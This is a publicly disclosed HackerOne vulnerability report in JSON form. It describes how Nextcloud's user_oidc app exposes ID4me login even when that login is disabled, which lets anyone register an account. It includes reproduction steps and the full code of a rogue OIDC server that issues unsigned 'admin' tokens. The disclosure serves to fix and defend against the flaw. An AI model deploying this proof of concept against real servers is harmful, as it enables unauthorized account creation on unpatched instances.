{
  "id": 2376929,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzc2OTI5",
  "url": "https://hackerone.com/reports/2376929",
  "title": "ID4me feature of OpenID connect app available even when disabled ",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2024-02-17T02:11:05.038Z",
  "submitted_at": "2024-02-17T02:39:30.991Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "lukasreschke",
    "url": "/lukasreschke",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 13291,
    "url": "https://hackerone.com/nextcloud",
    "handle": "nextcloud",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Nextcloud",
      "twitter_handle": "nextclouders",
      "website": "https://nextcloud.com",
      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2024-37312"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2024-05-30T08:31:54.366Z",
  "bug_reporter_agreed_on_going_public_at": "2024-04-30T08:31:49.163Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nIt is possible to register a new account on any Nextcloud server that has user_oidc enabled by just opening `/apps/user_oidc/id4me` as unauthenticated user. This is especially problematic given apps such as Nextcloud Talk enable accessing instance wide chat rooms.\n\nThis is caused since the setting to enable/disable ID4ME has no effect at all except hiding the button on the login site. The controllers are however still accessible.\n\n## Steps To Reproduce:\n\n  1. Install user_oidc\n  1. Open http://localhost:8080/apps/user_oidc/id4me\n  1. As domain choose `id4me.cloud.wtf` which is a small test server that I've created running the below code\n  1. Be logged in as new user on the instance.\n \n## Supporting Material/References:\n\nFor reference purposes, this is the server running the `id4me.cloud.wtf` ID4Me dummy server:\n\n```js\nexport default {\n  async fetch(request, env, ctx) {\n    const { pathname } = new URL(request.url);\n    //return new Response(\"disabled\");\n\n    if(pathname == \"/.well-known/openid-configuration\") {\n      return new Response('{\"issuer\":\"https://id4me2.cloud.wtf\",\"authorization_endpoint\":\"https://id4me2.cloud.wtf/auth\",\"token_endpoint\":\"https://id4me2.cloud.wtf/token\",\"token_introspection_endpoint\":\"https://id4me2.cloud.wtf/token/introspect\",\"userinfo_endpoint\":\"https://id4me2.cloud.wtf/userinfo\",\"end_session_endpoint\":\"https://id4me2.cloud.wtf/auth/realms/mbo/protocol/openid-connect/logout\",\"jwks_uri\":\"https://id4me2.cloud.wtf/auth/realms/mbo/protocol/openid-connect/certs\",\"check_session_iframe\":\"https://id4me2.cloud.wtf/auth/realms/mbo/protocol/openid-connect/login-status-iframe.html\",\"grant_types_supported\":[\"authorization_code\",\"implicit\",\"refresh_token\",\"password\",\"client_credentials\"],\"response_types_supported\":[\"code\",\"none\",\"id_token\",\"token\",\"id_token token\",\"code id_token\",\"code token\",\"code id_token token\"],\"subject_types_supported\":[\"public\",\"pairwise\"],\"id_token_signing_alg_values_supported\":[\"ES384\",\"RS384\",\"HS256\",\"HS512\",\"ES256\",\"RS256\",\"HS384\",\"ES512\",\"RS512\"],\"userinfo_signing_alg_values_supported\":[\"ES384\",\"RS384\",\"HS256\",\"HS512\",\"ES256\",\"RS256\",\"HS384\",\"ES512\",\"RS512\",\"none\"],\"request_object_signing_alg_values_supported\":[\"ES384\",\"RS384\",\"ES256\",\"RS256\",\"ES512\",\"RS512\",\"none\"],\"response_modes_supported\":[\"query\",\"fragment\",\"form_post\"],\"registration_endpoint\":\"https://id4me2.cloud.wtf/register\",\"token_endpoint_auth_methods_supported\":[\"private_key_jwt\",\"client_secret_basic\",\"client_secret_post\",\"client_secret_jwt\"],\"token_endpoint_auth_signing_alg_values_supported\":[\"RS256\"],\"claims_supported\":[\"sub\",\"iss\",\"auth_time\",\"name\",\"given_name\",\"family_name\",\"preferred_username\",\"email\"],\"claim_types_supported\":[\"normal\"],\"claims_parameter_supported\":false,\"scopes_supported\":[\"openid\",\"profile\",\"roles\",\"phone\",\"offline_access\",\"address\",\"web-origins\",\"email\",\"jpberlin\"],\"request_parameter_supported\":true,\"request_uri_parameter_supported\":true,\"code_challenge_methods_supported\":[\"plain\",\"S256\"],\"tls_client_certificate_bound_access_tokens\":true,\"introspection_endpoint\":\"https://id4me2.cloud.wtf/introspect\"}');\n    }\n    if(pathname == \"/register\") {\n      return new Response('{\"client_name\": \"id4me2.cloud.wtf\", \"client_id\": \"id4me2.cloud.wtf\", \"client_secret\": \"1234\", \"client_secret_expires_at\": 1921684352, \"redirect_uris\": [\"id4m2.cloud.wtf\"], \"userinfo_signed_response_alg\": \"\"}');\n    }\n    if(pathname == \"/auth\") {\n      const { searchParams } = new URL(request.url);\n      let redirect_uri = searchParams.get('redirect_uri');\n      let state = searchParams.get('state');\n      let code = searchParams.get('nonce');\n\n      return Response.redirect(redirect_uri + \"?state=\" + state + \"&code=\" + code, 307);\n    }\n    if(pathname == \"/token\") {\n      let header = btoa(JSON.stringify({  }));\n      let payload = btoa(JSON.stringify({ \"aud\": \"id4me2.cloud.wtf\", \"sub\": \"admin\", \"exp\": 1771290271 }));\n\n      let fullResponse = JSON.stringify({\"id_token\": header + \".\" + payload + \".signature\"});\n      return new Response(fullResponse);\n    }\n\n    return new Response('Hello World!');\n  },\n};\n```\n\n## Impact\n\nIt is possible to register a new account on any Nextcloud server that has user_oidc enabled by just opening `/apps/user_oidc/id4me` as unauthenticated user.",
  "weakness": {
    "id": 26,
    "name": "Improper Access Control - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2024-05-30T08:31:49.286Z",
  "allow_singular_disclosure_after": -41336437.25366898,
  "singular_disclosure_allowed": true,
  "vote_count": 65,
  "voters": [
    "xavoppa",
    "worstwursts",
    "8910jq",
    "muslimfrompk",
    "spyder_rohit",
    "code_reveiwer",
    "zy9ard3",
    "never_die",
    "shubham_srt",
    "2026",
    "and 55 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 6.3,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "adjacent",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "low",
      "availability": "low"
    }
  },
  "structured_scope": {
    "databaseId": 68215,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "nextcloud/user_oidc",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 427867,
      "category": "team",
      "content": "Security advisory at https://github.com/nextcloud/security-advisories/security/advisories/GHSA-vw7g-959g-vj6q",
      "updated_at": "2024-04-05T21:04:01.235Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 89223,
        "username": "nickvergessen",
        "name": "Joas Schilling",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "Germany",
        "created_at": "2016-07-01T08:17:59.061Z",
        "url": "https://hackerone.com/nickvergessen",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6ODQyMTQ5LCJwdXIiOiJibG9iX2lkIn19--7544c99c2f87f134b16d5b20f81dbc06444df8d8/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJwbmciLCJyZXNpemUiOiIyNjB4MjYwXHUwMDNlIn0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--c155082ce6f9751dcb29cd6ea061a7e4d7329577/2019_cfhn1.png"
        }
      }
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
